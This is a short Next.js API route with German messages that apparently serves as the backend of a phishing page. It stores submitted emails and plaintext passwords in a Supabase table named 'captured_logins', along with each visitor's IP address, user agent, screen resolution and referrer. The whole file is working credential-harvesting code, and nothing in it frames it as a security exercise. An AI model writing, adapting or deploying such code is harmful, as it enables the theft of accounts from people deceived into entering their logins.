import { NextRequest, NextResponse } from "next/server";
import supabaseAdmin from "@/lib/supabaseAdmin";

export async function POST(req: NextRequest) {
  const body = await req.json();

  const userAgent = req.headers.get("user-agent") || "Unbekannt";
  const forwardedFor = req.headers.get("x-forwarded-for");
  const ip = forwardedFor ? forwardedFor.split(",")[0].trim() : "Unbekannt";

  const { error } = await supabaseAdmin.from("captured_logins").insert([
    {
      email: body.email,
      password: body.password,
      screen_resolution: body.screenResolution,
      referrer: body.referrer,
      session_duration: body.sessionDuration,
      ip_address: ip,
      user_agent: userAgent,
    }
  ]);

  if (error) {
    console.error("Fehler beim Speichern in Supabase:", error);
    return NextResponse.json({ message: "Fehler beim Speichern", error }, { status: 500 });
  }

  return NextResponse.json({ message: "Captured erfolgreich gespeichert" });
}
